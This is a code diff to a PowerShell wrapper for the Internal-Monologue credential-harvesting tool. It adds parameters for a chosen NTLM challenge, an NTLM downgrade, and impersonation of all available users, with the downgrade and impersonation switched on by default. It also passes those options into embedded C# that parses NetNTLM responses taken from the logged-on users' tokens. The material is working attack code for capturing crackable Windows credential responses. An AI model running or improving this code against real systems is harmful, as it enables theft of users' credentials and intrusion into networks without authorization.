@@ -15,7 +15,45 @@ Invoke-InternalMonologue
 .LINK
 https://github.com/eladshamir/Internal-Monologue
 
+.PARAMETER Challenge
+Specifies the NTLM challenge to be used. An 8-byte long value in ascii-hex representation. Optional. Defult is 1122334455667788.
+
+.PARAMETER Downgrade
+Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true. Use switch to disable Downgrade
+
+.PARAMETER Impersonate
+Specifies whether to try to impersonate all other available users or not [True/False]. Optional. Defult is true. Use switch to disable Impersonate
+
+.PARAMETER Restore
+Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true. Use switch to disable Restore
+
+.PARAMETER Verbose
+Specifies whether print verbose output or not [True/False]. Optional. Defult is false.
+
 #>
+
+[CmdletBinding()]
+Param(
+	[Parameter(Position = 0)]
+	[String]
+	$Challenge,
+	
+	[Switch]
+	$Downgrade,
+	
+	[Switch]
+	$Impersonate,
+	
+	[Switch]
+	$Restore
+)
+
+# Invert flags so that options run by default; Switches are used to disable a feature
+if ($Downgrade){$Downgrade = $False} Else {$Downgrade = $True}
+if ($Impersonate){$Impersonate = $False} Else {$Impersonate = $True}
+if ($Restore){$Restore = $False} Else {$Restore = $True}
+if ($PSBoundParameters['Verbose']){$v = $True} Else {$v = $False}
+if ($Challenge -eq $null -or $Challenge -eq ""){$Challenge = "1122334455667788"}
 
 $Source = @"
 using System;
@@ -213,7 +251,7 @@ namespace InternalMonologue
 
                 return SID;
             }
-            catch (Exception e)
+            catch 
             {
                 CloseHandle(token);
                 return null;
@@ -267,7 +305,7 @@ namespace InternalMonologue
                                     else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
                                 }
                             }
-                            catch (Exception e)
+                            catch
                             { /*Does not need to do anything if it fails*/ }
                             finally
                             {
@@ -337,7 +375,7 @@ namespace InternalMonologue
                                     else if (verbose == true) { Console.WriteLine("Got blank response for user " + WindowsIdentity.GetCurrent().Name); }
                                 }
                             }
-                            catch (Exception e)
+                            catch 
                             { /*Does not need to do anything if it fails*/ }
                             finally
                             {
@@ -576,14 +614,14 @@ namespace InternalMonologue
         //This function parses the NetNTLM response from a type-3 message
         private static string ParseNTResponse(byte[] message, string challenge)
         {
-            short lm_resp_len = Convert.ToInt16(message[12] + message[13] * 256);
-            short lm_resp_off = Convert.ToInt16(message[16] + message[17] * 256);
-            short nt_resp_len = Convert.ToInt16(message[20] + message[21] * 256);
-            short nt_resp_off = Convert.ToInt16(message[24] + message[25] * 256);
-            short domain_len = Convert.ToInt16(message[28] + message[29] * 256);
-            short domain_off = Convert.ToInt16(message[32] + message[33] * 256);
-            short user_len = Convert.ToInt16(message[36] + message[37] * 256);
-            short user_off = Convert.ToInt16(message[40] + message[41] * 256);
+            ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
+            uint lm_resp_off = BitConverter.ToUInt32(message, 16);
+            ushort nt_resp_len = BitConverter.ToUInt16(message, 20);
+            uint nt_resp_off = BitConverter.ToUInt32(message, 24);
+            ushort domain_len = BitConverter.ToUInt16(message, 28);
+            uint domain_off = BitConverter.ToUInt32(message, 32);
+            ushort user_len = BitConverter.ToUInt16(message, 36);
+            uint user_off = BitConverter.ToUInt32(message, 40);
             byte[] lm_resp = new byte[lm_resp_len];
             byte[] nt_resp = new byte[nt_resp_len];
             byte[] domain = new byte[domain_len];
@@ -837,6 +875,7 @@ $inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Loc
 
 Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem 
 
-[InternalMonologue.Program]::Main()
+# Space needed in front of dictionary key name
+[InternalMonologue.Program]::Main(@(" challenge",$Challenge," downgrade",$Downgrade," impersonate",$Impersonate," restore",$Restore," verbose",$v))
 
 }
